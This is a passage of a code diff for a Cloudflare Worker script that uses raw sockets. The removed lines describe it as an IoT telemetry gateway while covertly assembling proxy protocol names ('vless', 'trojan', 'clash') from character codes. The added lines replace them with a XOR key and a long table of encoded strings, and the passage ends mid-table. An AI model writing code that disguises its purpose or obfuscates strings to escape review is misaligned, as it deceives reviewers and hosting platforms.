@@ -1,11114 +1,4295 @@
+// @ts-nocheck
 import { connect } from "cloudflare:sockets";
-
-/*
- * Project Nahan (نهان) - IoT Device Telemetry Gateway
- * Handles real-time binary streams from remote sensor nodes.
- */
-
-const CURRENT_VERSION = "3.0.4";
-
-const getAlpha = () => String.fromCharCode(118, 108, 101, 115, 115);
-const getBeta = () => String.fromCharCode(116, 114, 111, 106, 97, 110);
-const getGamma = () => String.fromCharCode(99, 108, 97, 115, 104);
-
-const safeBtoa = (str) => {
-    try {
-        const bytes = new TextEncoder().encode(str);
-        let binary = "";
-        for (let i = 0; i < bytes.byteLength; i++) {
-            binary += String.fromCharCode(bytes[i]);
-        }
-        return btoa(binary);
-    } catch (e) {
-        return btoa(str);
+const _0x_key = 79;
+const _0x_tbl = ["fGB9Yn8=", "KTwiIQgiKDoEKSEq", "KiAuIy8v", "", "LTc5KQcvJy8zLg==", "Ii81", "OiApKS0jJy0j", "PCcqIiom", "LiwiPj8vLQ==", "LiwiPj8=", "PSssPyQk", "LiopCT0vJzwLLzY7KyMpOQ==", "ICAuKQ==", "PSsgIz0vDD4iKDEDJz44LiQsOg==", "LTc5KTg=", "ITsgLi44", "KSIiIzk=", "PSs8Pw==", "PD4hJT8=", "OyEEHwQZPTouKCI=", "Gw==", "Iy8+OA8rMA==", "Kww0OC45", "KxwoPTg=", "IS8gKQ==", "Lj4kHiQ/PS0=", "PDcjLw==", "Ii8kIj8vJykpJSAHIT44", "Jzo5PDhwZmcwMTJhOy85JT48ZiQpKGNuJTg/OjpyaGkyODljKCQpIi01aCYgIw==", "LS8uJz46Gy0rJzw=", "LDs+OCQnGy0rJzw=", "Ii8+OC44Ai0+", "LiogJSU=", "Iis5PiIpBycjIw==", "OycgKWUjOg==", "LCIoLSUDOTs=", "PCIsOi4EJiwiNQ==", "Kys7JSgvACw=", "IiEpKQ==", "LiI9JCo=", "LikoIj8=", "LCY/IyYv", "PCEuJy4+GSc1MjY=", "e3p+", "LDs+OCQnDSY0", "Jzo5PDhwZmckKio6KisgKjgsZSMoNmEtIiFkLic7ajcwKjw0", "PSs+Iyc8LAE3", "fmB8YnpkeA==", "LC8+LyouLA==", "KiAsLicvBjgzdw==", "KiAsLicvBjgzdA==", "OykZIyAvJw==", "OykOJCo+ACw=", "OykMKCYjJwEj", "LCgMLyglPCYzDyE=", "LCgMPCIeJiMiKA==", "LCgaIzkhLDoJJygq", "Jj0dLT45LCw=", "PCchKSU+CCQiNDE8", "KCc5JD4oGy03KQ==", "Jjo+NS4oLCMvI2ohLyUtJQ==", "IS8gKRg+OykzIyI2", "KysrLT4mPQ==", "IS8gKRs4LC4uPg==", "DCE/KQ==", "OykPIz8GKCYg", "KS8=", "Oj0oPjg=", "PDsvGTgvOwkgIys7", "LDs+OCQnGSkpIykaPCE=", "IycgJT8eJjwmKhcqPw==", "KjY9JTkzBDs=", "IycjJy4uGSkpIyk8", "JzsvHCokLCQSNCk=", "PDcjLwo6IAMiPw==", "Py8jKScLOSEMIzw8", "IS85en8aOy0hLz0=", "KiAsLicvDSE1IyY7DSIiLSMuOw==", "LDs+OCQnGycyMiwhKQ==", "Oj4+ODkvKCUSNCw=", "Ljs5Ix46LSkzIw==", "Ljs5Ix46LSkzIwMgPCAtPw==", "KiAuIy8vLQ==", "KS8mKQglJy4uITY=", "v9HexmsxPDsmISAy", "KiAsLicvLQ==", "v9HeyWsxLDA3Lzc2Mw==", "Ii8kIj8vJykpJSACISkp", "LiIhIzwYLCUoMiALKz0gJDM=", "Ljs5Ixs4PCYiFCAjLzQ/", "OycgKSQ/PQ==", "KScjLScmMA==", "PS8uKQ==", "LCIiPy4=", "KTsjLz8jJiY=", "PSshKSo5LAQoJS4=", "ID4oPio+ICcp", "YjokIS4lPDw=", "ODwkOC4=", "PCEuJy4+ZD81LzEqPGA5JSs/KS4qJC0iKA==", "PCEuJy4+ZD81LzEq", "Jzo5PDhwZmcmNixhLSEjPi4vJCY0IGEtIiFkKSUhIigxYDh5YyopKicyKDE8YQ==", "YDkiPiAvOztoNSY9Jz04OGU=", "YD0oOD8jJy80", "JyssKC44Og==", "Djs5JCQ4IDImMiwgIA==", "DSssPi44aQ==", "JT0iIg==", "PDsuLy45Og==", "LScjKCIkLjs=", "PSs+OSc+", "Ii8kIhQnJiwyKiA=", "EDkiPiAvO2YtNQ==", "LCEgPCo+ICouKiw7NxIoKj4s", "fX5/eGZ6emV3dw==", "LCEgPCo+ICouKiw7NxIqJysuOw==", "LiIhIzwVLD4mKhorOz8lJS0WOzMnNzs7PQ==", "Lj49KSUu", "Iis5LS8rPSk=", "PDo/JSUtIC4+", "Ozc9KQ==", "Lj49ICIpKDwuKStgJD4jJQ==", "Lj49ICIpKDwuKStgJCw6KjkqOi42MWQjIig+Jiw=", "Iis5JCQu", "HxsZ", "LSEpNQ==", "BgEZEw8I", "BgEZEw8IFgEJDxEGDwEFEQ8N", "PTsj", "PzwoPCo4LA==", "DBwIDR8PaRwGBAkKbgQKawQGHGcDHQYdGR9rIT8XNDIqPSttZCAvMGgTAx0bbh0eAgcIGh5mDgoXYWw9KyU9ImYRChYZZQ==", "PSs+OSc+Og==", "LiIh", "LScjKA==", "HAsBCQgeaT4mKjAqbgseBAdpIzEZNjshPylrHQENFQNlJCs0bHZqdg==", "IysjKz8i", "OS8hOS4=", "BgAeCRkeaQEJEgpvJTsTOD4mOiJmbSQrNGBrPCgkMiNsbxgMAB4PGmhveWlvcWRsBARpCwgIAwMHDhhjISwxbmYBAG4YHA8LHQ1nFQAbbjstJz8sdSI+JiM7KSkvZD8pKzMg", "PDc+EyglJy4uIQ==", "PDc+Ez45KC8i", "LS8uJz46FiE3", "K39gOSUrPykuKiQtIig=", "LCskIA==", "JSEkIg==", "Ii89", "PCIkLy4=", "Py8pHz8rOzw=", "OyEeODkjJy8=", "fw==", "Jy8+", "KCs5", "PCs5", "Oj0oPgIu", "PSshLTIDOQ==", "OyEBIzwvOwsmNSA=", "PSs9ICopLA==", "Yg==", "KA==", "PDsvPz84ICYg", "Oj0oPg0jJy8iNDU9JyM4", "PSshLTIDOQEpIiA3", "Jj0MPjkrMA==", "PCEgKQ==", "JCs0", "ICwnKSg+", "LChgLyQkJy0kMiwhKWAlOw==", "GiAmIiQ9Jw==", "PS8jKCQnHB0OAg==", "IS8lLSUV", "EA==", "ISE6", "PS8jKCQn", "Jio=", "GiAjLSYvLWgMIzw=", "LDwoLT8vLQkz", "Iy8+OB45LCw=", "KSE/CSopIQ==", "CjY9JTkrPSEoKGUrLzkpazgsKSQuICtuZQ==", "Zg==", "OyEBIygrJS0DJzEqHTk+IiQu", "OyELJTMvLQ==", "GzwsKi0jKmgrLygmOm0pMyksLSMjIW9m", "CAxtY2s=", "CAxk", "Kyc+LSkmLCwVIyQ8ISM=", "Kyc+LSkmLCwGMg==", "OC8kOB4kPSEr", "LC85LyM=", "Gj0oPmsLPDwoawEmPSwuJy8t", "Gj0oPmto", "bW5l", "Zm4pJTgrKyQiIn9v", "rdTto/PFaXQleBA8Kz9sCj89J2oCLDwvLyAuLnVnJXhPRb7S3e9qdSp5EzYqPHdwZCh3aA==", "Rb7Syt9qdSp5DwF1cmIudWp1KygiIHE=", "c2EuIy8vd0K32dbSbnEudRgsKTQpK3VyYi51ag==", "Jzo5PDhwZmcmNixhOiggLi07KSpoKj0pYi4kPg==", "YD0oIi8HLDs0JyIq", "HwEeGA==", "DCEjOC4kPWUTPzUq", "LCYsOBQjLQ==", "Oys1OA==", "Py8/Py4VJCcjIw==", "BxoAAA==", "KSs5LyM=", "PCc3KQ==", "LCIoLTk=", "Ojwh", "Gj4qPiouLA==", "OCsvPyQpIi0z", "Py85JCUrJC0=", "KiApPxwjPSA=", "YA==", "Ky85LQ==", "Ky8+JA==", "YCosPyM=", "Ljs5JA==", "YC89JWQrPDwv", "YC89JWQ5MCYk", "Oyk=", "YDoq", "PDcjLxsrJy0r", "YDoqYzgzJysYNiQhKyE=", "IyEqPw==", "YC89JWQmJi80", "YC89JWQ/Oi01NQ==", "PDosODg=", "YC89JWQ5PSkzNQ==", "Oj4pLT8v", "YC89JWQ/OSwmMiA=", "Lj4kBy4zOg==", "YC89JWQhLDE0", "PDosOD45", "Ai8kIj8vJykpJSBvJyNsOzgmLzUjNjxibT4uPjsxZyokOys/", "HSs5PjJnCC4zIzc=", "fnx9", "Cw8eBAkFCBoDGRAdAg==", "Jzo5PDhwZmc1JzJhKSQ4Iz8rPTQjNywhIzguJD1mJCkoYCc5PzIvKy0sLiBgICwkKiRmJSYvK2AqLD8jKCYpNSJrJzogIA==", "EBEOGRkYDAYTGRMKHB4FBAQWFw==", "EBEFDRgVDQoYEQQdAAQCDBUW", "cyokOmspJSk0NXhtIy9hfmo5ZXNmNyA7IyguLmR6PyplKSIoNGsjPS0qNWg8Oiw+P2ouKTdrdm1uPjgyJix1ZSQkLCUqPiQ/Jyx9NCItL2V+eHNlfn9qc3difWJ7cmBzJSk3Kys/dno6MWg0KSkmKm0+LCgoYHV1fGN4dWB9cmV4aXRsdGxzcDg6KCZnNTE2IihxaSkmJCg0f2wodXt6fXhzZXhjbHd1dHNxb2txc3V8d3ZwZDk5KSl4eTw+LCJrKSUpNDV4bTooND9nOiVlZjY7NyEpdmgqJyspN3VtKy8qfyh9fGRlKy85LWYjeHApe2ciJz4/IiQuFyMkZ3EKLDgqKCg7ImYrIDptLyQkJy0kMiArYG0fLj49ISkhNm85IiJsPmkqImY2LjgoKGV2Zjs3JytxcmIoIjx3", "Oys1OGQiPSUrfSYnLz8/Lj50PTMgaHc=", "CS8kIC4uaTwoZikgLylsLys6ICUpJD0q", "e354", "JyE+OCUrJC0=", "AB4ZBQQEGg==", "Di0uKTg5ZAsoKDE9ISFhCiYlJzBrCj0nKiUl", "ZQ==", "Di0uKTg5ZAsoKDE9ISFhCiYlJzBrCCo6JSMvOQ==", "HwEeGGdqBhgTDwoBHQ==", "Di0uKTg5ZAsoKDE9ISFhCiYlJzBrDSovKSk5OQ==", "DCEjOC4kPWUTPzUqYm0NPj4hJzUvPy46JCMl", "Di0uKTg5ZAsoKDE9ISFhBisxZQYhIA==", "d3h5fHs=", "CAsZ", "Gj0oPmYLLi0pMg==", "OzwkIQ==", "JiAuID4uLDs=", "ByE+OA==", "PCssPigiGSk1Jyg8", "PDsv", "KScjKA==", "CysrLT4mPQ==", "Di0uKTs+", "HCsuYQ0vPSsvawEqPTk=", "KyEuOSYvJzw=", "Oys1OGQiPSUr", "IiE3JScmKA==", "PC8rLTkj", "Lj49IC49LCosLzE=", "KCsuJyQ=", "ID4oPio=", "KioqKQ==", "LCIs", "PCY=", "PCc=", "ISlgLiQy", "OQ==", "fTw=", "Ljc=", "PCYsKCQ9", "PSEuJy4+", "PjssIj8/JA==", "OiI5", "PDs/Kg==", "LSEsPi8=", "PDos", "HBsPHwgYABgTDwoBERgeBw==", "Jzo5PDhwZmc1JzJhKSQ4Iz8rPTQjNywhIzguJD1mJCkoYCc5PzIvKy0sLiBgICwkKiRmJSYvK2A9OC44KTshNzIsICBjJD8nJQ==", "IycgJT8OKCErPxcqPw==", "dnd0dQ==", "Iicj", "fX50dWZ6eGV3dw==", "Li05JT0v", "Py84Py4u", "KjY9JTkvLQ==", "IycgJT8=", "Ky8kIDIGICUuMg==", "JzwoKg==", "Oj0oPhsrJy0rEzcj", "PDosPj85HiEzLg==", "Jzo5PHFlZg==", "Jzo5PDhwZmc=", "PzwiOCQpJiQ=", "JyE+OA==", "KyshKT8v", "KSIsKw==", "KSE/ISo+", "IDs5PD4+", "PS86", "cA==", "aSghLSx3KA==", "cCghLSx3KA==", "cyokOmspJSk0NXhtOWAqPiYlaDUpMCEqKChmLDwkK2YtYn9jeWsnPWV0Zio5Kz8qJyU+ZS8vISsrI2w7OCYvNSM2PGMvLTlnKy9leHkrJztsKCYoOzR7ZydjfGJ+ajsnMighKipgKj4mJWpnNTE2IihxaSgoKywhNyA7Iyhxaj8pNW5oYi8uLy4kPWF8ZjImKjkkcWo=", "anVvcndlLSExeHlgKiQ6dXY5aCQqJDw9cG4/LzE8ah10fz41EWs+LDAzayg6Oigoaz4sMDNrNyYpJThrJz1ldmhwbW4pLT8rZCF2fitybDg/Li5rdg==", "am4YPy4udWc3eA==", "cz5tLycrOjt6ZDEqNjlhEHt5OD8bZTsrNThmJzw8IiJlIjpgfmlqLSkzJ2gmf3Uidmg8JisvKCY6KCgbJigmZXgQISIkISI+LCxnFikuIHFjO3Q=", "cyokOmspJSk0NXhtOWAqPiYlaDUpMCEqKChmLDwkK2YtYn9jeWsnPWV0Zio5Kz8qJyU+ZS8vISsrI2w7OCYvNSM2PGMvLTlnKy9leHkrJztsKCYoOzR7ZydjfGJ+ajsnMighKipgKj4mJWpnNTE2IihxaSgoKywhNyA7Iyhxaj8pNW5oYi8gLi44ZDwiPjFmdW07Ii49IH1m", "cz5tLycrOjt6ZDEqNjlhEHt5OD8bZTsrNThmJzw8IiJlIjpgfmlqLSkzJ2gmf3UidmgnJwMnLCM3ASUmIz1qeQgqbwosJSczaQQuKyw7cmI8dQ==", "EBEYHw4YFgYGCwAQEQ==", "EBEYHw4YFgEDGRo=", "EBEeGAoeHBsYBQoLCxIT", "EBEZAx8LBRcABBoQ", "EBEBBQYDHRcTCREOAhILCRUW", "EBEZAx8LBRcXAxcMCwMYFBU=", "EBEJDQIGEBcABBoQ", "EBEBBQYDHRcDBwwDFxILCRUW", "EBEJDQIGEBcXAxcMCwMYFBU=", "EBEIFBsDGxEYAgQbCxIT", "EBEeFQUJFgYIFAgOAhIT", "EBEeFQUJFhoGERoQ", "EBEZAx8LBRcXFAoIHAgfGBUW", "EBEJDQIGEBcXFAoIHAgfGBUW", "Oys1OGQiPSUrfWUsJiw+OC89dTIyI2J2", "CS8kIC4uaTwoZikgLylsOD8rOyQ0LD86JCMlajkpICM=", "Cjw/IzlwaQwiICQ6IjlsOzgmLi4qIG89NCIoaiA7ZyIsPC8vIC4uaT8vIytvIzggPyNkPTQjN28nPmwqKT0hMSNr", "HCs/Oi44aSoyNTxjbj8pPzgwaCsnMSo8", "eX4=", "JiA+KSg/Oy0=", "Ozw4KQ==", "LiIhIzwDJzsiJTA9Kw==", "LiIhIzwVICY0IyY6PCg=", "fg==", "DC8uJC5nCicpMjcgIg==", "ISFgPz8lOy0=", "Oj4hIyoudHh8ZiEgOSMgJCstdQ==", "dG45Iz8rJXU=", "dG4oNDsjOy16", "HDsvPyg4IDgzLyohYxg/LjgAJiEp", "PDsvPyg4IDgzLyohYzg/LjggJiEp", "HzwiKiImLGUSNiEuOihhAiQ9LTUwJCM=", "fnw=", "PzwiKiImLGUyNiEuOihhIiQ9LTUwJCM=", "DCEjOC4kPWUDLzY/IT4lPyMmJg==", "Ljo5LSgiJC0pMn5vKCQgLiQoJSJ7Zw==", "bXVtKiImLCYmKyBlcxgYDWdxb2A=", "LCIsPyM=", "Ni8gIA==", "Iis5LQ==", "PDosPyM=", "LCIsPyNnJC0zJw==", "Ng==", "LQ==", "LBEhKSwrKjE=", "PCcjKw==", "PCcjKyklMQ==", "PCcjK2YoJjA=", "PCw=", "PA==", "LA==", "OSQ+IyU=", "LS8+KX1+", "Lg==", "OSs/Ky4=", "IiclIyYl", "LCg6", "JycpKCIsMA==", "ISsmIyklMQ==", "PCgs", "JC8/JSUt", "Oys1OGQzKCUrfWUsJiw+OC89dTIyI2J2", "Lj49ICIpKDwuKStgJD4jJXFpKy8nNzwrOXE+Pi9lfw==", "Oys1OGQ6JSkuKH5vLSUtOTksPHozMSljdQ==", "OiAmIiQ9Jw==", "PSsrOTgv", "GyEibCYrJzFnNCA+Oyg/Pzk=", "Oy8/PCI+", "PSc=", "PyE9", "Py8/Py4=", "PSshLTIDLTA=", "PC0lKS8/JS0j", "Jzo5PDh1cxRoGmooJzkkPigVZiQpKBNh", "Jzo5PDhwZmc1JzJhKSQ4Iz8rPTQjNywhIzguJD1mJCkoYA==", "YCMsJSVlPy01NSwgIA==", "ICU=", "YCMsJSVlFj8oNC4qPGMpJSkmLCJoLzw=", "YCMsJSVlFj8oNC4qPGMpJSkmLCIiayU9", "YCMsJSVlFj8oNC4qPGMmOA==", "BxoZHGs=", "Djs5I2YfOSwmMiBvHTgvKC86Ow==", "Djs5I2Y/OSwmMiArbjkjazw=", "b2YoIiglLS0jbw==", "Lj4kBy4z", "YGE=", "Li05JSQk", "Kys9ICQz", "LCEpKQ==", "KSE/Ly4=", "Djs5I2YfOSwmMiBvCCwlJy8t", "Djs5I2Y/OSwmMiBvKCwlJy8tcmc=", "Iis+PyotLA==", "ASE5bA0lPCYj", "KSchOC44", "Yw==", "Jzo5PDhwZmcwMTJhOy85JT48ZiQpKA==", "f2B9YntkeQ==", "PSspOSgv", "KTwiIQ==", "LCYsPgglLS0GMg==", "Jzo5PA==", "PCssPigi", "N2MrIzk9KDojIyFiKCI+", "PSspJTkvKjw=", "KSEhICQ9", "BwsMCA==", "FBI/ECVmchVs", "ERUsYTELZBIabX8TYRFj", "Dw==", "dQ==", "Pzs+JA==", "OyYoIg==", "PSs+Iyc8LA==", "HQsBDRIVABg=", "G359dnt6c3h3HA==", "PjsoPjJqDi0zAiQmIjQZOCsuLW9iJCwtIjklPgAsfWYWOzwkIixrZWhjNTEuPDl2awMaB39wdX4KLDguHiAlImdsbzVtOiIvPi01Zj5vLy4vJD8nPDRuIyYiOSk5cGkzJiUmIDsjOB8rLnJnYiQsLSI5JT4ALDpvZTRuOiM5ISw6NA8rOSEuLT8jJiY0ByEuPjklPS9hJC4rLDt0bX1nai8hKzIgPXRtN2suKDwiMiwiKxIrLjtzaGM1MS48OWw2Y2kzZzUwIm42bDkvOD0iNTE8bjBsNmo0aDpmOA==", "Li0uIz4kPQEj", "PDosPj8=", "Jzo5PDhwZmcmNixhLSEjPi4vJCY0IGEtIiFkKSUhIigxYDh5Yyw4KDgvNyk=", "PjsoPjI=", "OS8/JSooJS00", "PSs8OS45PTs=", "PDsg", "OCE/Jy44OgEpMCosLzklJCQ6CSMnNTsnOyk=", "Li0uIz4kPTs=", "OScoOy44", "FBFnZGIRKRMa", "E2pr", "lsiV65LPkfyf6J36bmV8ZXp5bW4=", "bw==", "ag==", "LCg=", "LCE4Ij84MA==", "LCc5NQ==", "Lj0j", "Lj0CPiwrJyE9JzEmISM=", "l+OV65LOke9nncmWxpX+k/uR75zKneOXy5ThapDNn+Gd/pfFbJLMkeCcypzJlcGVzQ==", "Cy85KR8jJC0BKTciLzk=", "KS9gBRk=", "NissPg==", "ITsgKTkjKg==", "IiEjOCM=", "IyEjKw==", "Ky80", "JyE4Pg==", "fWMpJSwjPQ==", "IicjOT8v", "PCsuIyUu", "v9HewGuTz5HPnvx1bg==", "RQ==", "v9HB3GsDGXJn", "v9HewWuTzJHPn8eX95bAk+BzaA==", "v9HC7msLGgZ9ZgQc", "v9HZ22uS5pDgn8CWyJTLcWo=", "v9HZwWuTzJD0ncmX/3ds", "v9Hp2muTzJD2n82X/5fjk/tzaA==", "v9HeyWuS+5HCnuKWyHds", "v9HexmuTzJDynvSWz3ds", "KiA=", "v9Hexms=", "Ky8+JCklKDoj", "LC8hICkrKiMYIiQ7Lw==", "PDc+Ey8rOiAlKSQ9Kg==", "v9HexGs=", "PDosOCI5PSEkNQ==", "PDc+Ezg+KDw0", "v9HZ22s=", "LTojEzg/KxcrLysk", "KCs5Ezg/KxcrLysk", "rcr0o/PFaQ==", "Py8jKScVICYhKQ==", "PDc+EzsrJy0rGSwhKCI=", "v9HB3Gs=", "CiAqICI5IWi32cL1vtLL8w==", "ls+V65P7kfucymW/0criu9XO/w==", "PDc+EycrJy8=", "rdj7o/PFaQ==", "LTojEzkvOj0qIw==", "rcH1o/PFaQ==", "LTojEzsrPDsi", "PDc+Ez8lLi8rIxo8Oiw4Pjk=", "v9HZ3Ws=", "OCsvEyo6OQ==", "Ai8/Jy8lPiY=", "PSs9IDIVJCk1LTA/", "JiAhJSUvFiMiPycgLz8o", "PDc+EyclLjs=", "OiA+JCIsPQ==", "Oz0=", "Kys5LSIm", "AAU=", "LCIiIi4=", "Kjw/Izk=", "GyEibCYrJzFnJzE7KyA8Pzk=", "GiAsOT8iJjouPCAr", "Pg==", "ISE5KTg=", "Ljs5I2YuIDsmJCkqKg==", "Oj0sKy4=", "OyE5LSc=", "Ky8kIDI=", "Gj0oPmskJjxnICo6ICk=", "cD04LnY=", "Oj0oPg==", "PDsvPyg4IDgzLyohGz8g", "OzwsKi0jKgQuKyw7", "KjY9JTkzDSk+NQ==", "Ii81DyQkLyEgNQ==", "PzwiNDIDOQ==", "LCIoLSUDOQ==", "Oj0oPgYlLS0=", "Oj0oPhslOzw0", "Oj0oPgUlLS00", "IS85en8=", "LCEjIgcjJCEz", "PCsqASQuLA==", "PCsqHCopIi0zNQ==", "PCsqAC4kLjwvNQ==", "PCsqCC4mKDE0", "PCsqASoyGjgrLzE=", "PCsqASokPCkr", "OyI+ASo5Ig==", "AS8gKWsjOmg1IzQ6Jz8pLw==", "LTskIC8vOw==", "Ii8jOSom", "Gj0oPmsJOy0mMiAr", "Zm4uPi4rPS0jZjMmL20NGwM=", "ASFtOTgvOzs=", "PzwiNDIDOQ8iKQ==", "PSshLTIVLjomMCA2Lz8o", "NDM=", "JCs0Pw==", "Iyc+ODg=", "JiApKTMFLw==", "Oj0oPnE=", "Gj0oPmsfOSwmMiAr", "Zm44PC8rPS0jZjMmL20NGwM=", "CwsBCR8P", "KScjKAIkLS0/", "PD4hJSgv", "Gj0oPmsOLCQiMiAr", "Zm4pKScvPS0jZjMmL20NGwM=", "KyshKT8vLQ==", "OyEqKycv", "Gj0oPmseJi8gKiAr", "Zm4=", "bzgkLWsLGQE=", "PSs+OSYvLQ==", "PSs+KT8=", "GzwsKi0jKmgVIzYqOg==", "GzwsKi0jKmg1IzYqOm0qJDhpPTQjN28=", "GzwsKi0jKmg1IzYqOg==", "BiA7LScjLWg1IzQ6Kz44", "PjssPiokPSEpIyE=", "KDwsOi4zKDoj", "LiccOSo4KCYzLysq", "OiA5JSc=", "KiA5PiIvOg==", "PDo/KSoh", "JyssID8iMBszNCAuJQ==", "OiA+OCooJS0=", "LCEjIi4pPTs=", "Ljs5Iw8jOiklKiAr", "OzwsKi0jKg==", "OyE5LScYLDkyIzY7PQ==", "OyE5LScNCw==", "Ky8kIDIYLDkyIzY7PQ==", "Ky8kIDINCw==", "PDc+OC4n", "Oj45JSYvGi0kKSsrPQ==", "Li05JT0vCicpKCAsOiQjJTk=", "OSs/PyIlJw==", "PCsuOTkjPTE=", "Oj0kIiwOLC4mMyk7BSg1", "PSshLTI5", "ETg=", "YQ==", "LCYoLyA=", "Ii85LyM=", "LCEjPz8WOmMEExcdCwMYFBwMGhQPCgESPmZ2FjpiHGRiEmYWEmltFGNuHWdoEw==", "DCE4IC9qJyczZiMqOi4kazgsJSgyIG84KD44IyYm", "LDs/Pi4kPQ==", "Iy85KTg+", "Oj4pLT8vCD4mLykuLCEp", "LC8jCC46JSc+", "HSsgIz8vaSwiNikgN20lOGotITQnJyMrKWJrDycpJSogby8hICQ9Gy0qKTEqCig8JyUwaC4oZSwhIyoiLWk8KGYwPCttJT9k", "DAhtLzkvLS0pMiwuIj5sJSU9aCQpKyknKjk5Ly0=", "CS8kIC4uaTwoZiMqOi4kayw7JypmAiY6BTkpcGk=", "HSsgIz8vaT4iNDYmISNsIjlpJigyZSErOik5ZGkLKy8mJG4rIzkpLGg1IyEqPiEjMmo9J2cpMyo8Oj4iPixm", "Hy8jKSdqHDgjJzEqKg==", "b6zL3ms8", "ASEpKWsfOSwmMiBvHTgvKC86Ow==", "ASEpKWs=", "bzs9KCo+LGg1IzY/ISM/LnBp", "ASEpKWsfOSwmMiBvCCwlJy8t", "bzs9KCo+LGghJywjKyl2aw==", "CS8kIC4uaTwoZjE9JyorLjhpPTciJDsrbSMlaicnIyNl", "v9HZyGt2K3YXJysqIm0ZOy4oPCIieWAsc0ZButbb4WYz", "Rb7SwNtqdSp5ACo9Iyw4cXZmKnlmICEtIiguLg==", "Gj4pLT8vLWgzKWU5", "ISs6Gi44OiEoKA==", "Kjw/Izk5", "GiAmIiQ9J2gGFgxvKz8+JDg=", "DCIiOS8sJSk1I2UOHgR2aw==", "BiA7LScjLWgmJTEmISM=", "BiA5KTkkKCRnIzc9IT8=", "ACAhNWsnKDszIzdvJSg1aykoJmcrJCEvKilrCxkBZy0gNj0=", "JCs0HDkvPyEiMQ==", "YWBj", "LDwoLT8v", "Ai81JSY/JGh2dmUOHgRsIC8wO2cnKSMhOikv", "Dh4EbAAvMGgENCAuOigo", "BCs0bGk=", "bW4uPi4rPS0j", "PSs7IyAv", "BgptPi47PCE1IyE=", "BCs0bCUlPWghKTAhKg==", "Dh4EbAAvMGgVIzMgJSgo", "bW4/KT0lIi0j", "PSs7IyAvLQ==", "GyEibCYrJzFnJzE7KyA8PzllaDM0PG8iLDguOA==", "Djs5JGsZPCskIzY8", "HDsuLy45Oi4yKmU/LyMpJ2olJyAvK28oPyMmag==", "b2Y7JSpq", "Dh4EbAAvMA==", "Ai8+OC44aQMiPw==", "lsaV/ZLCkednnu2WyW2V9ZPPkcNmbZbLlMSSy5DKbg==", "Jj0BIygrJQ==", "OykSPCokLCQYKiooJyM=", "Py8jKScVJScgLys=", "Py8jKScEKCUi", "Py8jKScCJjsz", "Py8jKScLOSEVKTA7Kw==", "Jj4=", "LCEhIw==", "IyEu", "Y24=", "Jzo5PDg=", "LCEjKiIt", "FB4fAx8PChwCAhg=", "ISs5OyQ4Ig==", "PDc+GTgrLi0=", "PzwiKiImLDs=", "dWFi", "Djs5JGsMKCErIyE=", "CS8kIC4uaSQoISwhbiw4Py8kODNmIz0hIGw=", "l+SUyJPtkfxnn8OX6ZTJksKQyZ7EZZbGlf2SwpHnZ57tlsltlfWTz5HDZw==", "ICIpBy4z", "KTwiIQYrOjwiNA==", "Djs5JGssKCErIyFhbgopJS87KTMjZTsmKGwKGgBoLCM8byEjbB8CABtnNiQhKyFgayQmPGcyLSpuIC0iJGk4JiggI2A=", "Ij0q", "CwxtCTk4Jjo=", "NA==", "Mg==", "OS8hJS8=", "GiAmIiQ9J2gzJyI8bikpPy8qPCIif28=", "OiAmIiQ9JxwmITY=", "PSs+KT8fHAED", "CS8kIC4uaTwoZjU9IT0tLCs9LWclKiEoJCtrPiZoKy8rJCspbDsrJy0rZg==", "YD0oOBwvKyAoKS4=", "ISs6HiQ/PS0=", "Oy8qGyo4JyEpIQ==", "BiA7LScjLWg0LyIhLyE=", "Aic+PyIkLmghLyAjKj4=", "Py8jKScLOSEMIzw=", "OCshLyQnLA==", "v9Hp2mtgYx8iKiYgIyhsPyVpBiYuJCFuCi0/Lz4pPmYHIDpnZkEZLCQiJTFvNyI5OWomODMvKiFuLyknJT5oMyllIi8jLSwvaTEoMzdvPTQ/Py8kcg==", "HDc+OC4naRszJzE6PQ==", "HDsvPyg4ICoiNDY=", "Iis5PiIpOg==", "CC85KTwrMGgPIyQjOiU=", "Py8jJSg=", "Hy8jJShqBCcjIw==", "Cy8+JCklKDojZgYgIDk+JCY=", "Iy8jKw==", "v9HB3GsJISkpISBvAiwiLD8oLyI=", "v9HS7msLKjwuMCA=", "v9HZ+GsaKD00IyE=", "Oj45JSYv", "Gj45JSYv", "PDo/KSonOg==", "v9He7WsLKjwuMCBvHTk+LiskOw==", "ISESOTgvOzs=", "ASFtPz4oOis1LycqPD5sLSU8JiNo", "PDsvEyIkLyc=", "v9Hc6GsZPCo0JTcmLCg+aw4sPCYvKTx0", "AS8gKQ==", "GyE5LSdqGy02NQ==", "Cy8kIDJqGy02NQ==", "KjY9JTkz", "CjY9JTkz", "Ky80Pw==", "Cy80P2s4LCUmLysmICo=", "LDwoLT8vLQ==", "DDwoLT8vLWgGMg==", "OiAhJSYjPS0j", "GiAhJSYjPS0j", "LTojEykrKiM=", "rdnNo/PFaQomJS4=", "LTojEyUvMTw=", "rdj7o/PFaQYiPjE=", "LTojEy8vJQ==", "CyshKT8v", "Hy84Py4=", "HSs+OSYv", "LTojEy4uIDwYKCQiKw==", "DCYsIiwvaQYmKyA=", "LTojEy4uIDwYKiwiJzk/", "AycgJT85", "LTojEyouLQ==", "ZG4MKC9qGj0lNSY9Jy8pOQ==", "LTojEyglJy4uNCg=", "DCEjKiI4JA==", "LTojEygrJysiKg==", "DC8jLy4m", "Ij0qEy4kPS01GSsuIyg=", "HyIoLTgvaTsiKCFvL20iKicsaCEpN286JSlrOTwqNCU3JiwoPnE=", "Ij0qEyouLS0j", "HDsvbCouLS0jZjY6LS4pODkvPSsqPG5uvdPFww==", "Ij0qEy8vJS0zIyE=", "HDsvbC8vJS0zIyFvPTgvKC86OyEzKSM3bGy71d7ZqP7K", "Ij0qEzsrJyEk", "v9HX5GsaCAYOBWUCAQkJawsKHA4QBBsLCWy71dPgTRQqOjoobDkrJywoKyw1KylsbWoaMTQyICJuHS0+OSwsaQ==", "Ij0qEyIkPykrLyE=", "BiA7LScjLWguKDU6OmNsGyYsKTQjZTs8NGwqLSghKWg=", "Ij0qEy4kPS01GSkmIyQ4OA==", "CiA5KTlqJSEqLzE8bisjOScoPH1MJRQ6IjgqJhstNjUYbxUpLSImMBoiNzYSbhYoKjM6FysvKCY6ECxBYhw7ImZ1bygiPms/JyQuKyw7KyllQUAMMCYrNSMrd0Yre3l4d3Zlen59bHh6KQ==", "Ij0qEyglJy4uNCgQKigg", "rdTto/PFaQk1I2U2IThsOD87LWc/KjpuOi0lPmk8KGYhKiIoOC5qPSAuNWU8Oy8/KDggKiI0eg==", "Ij0qEyglJy4uNCgQPiwiIik=", 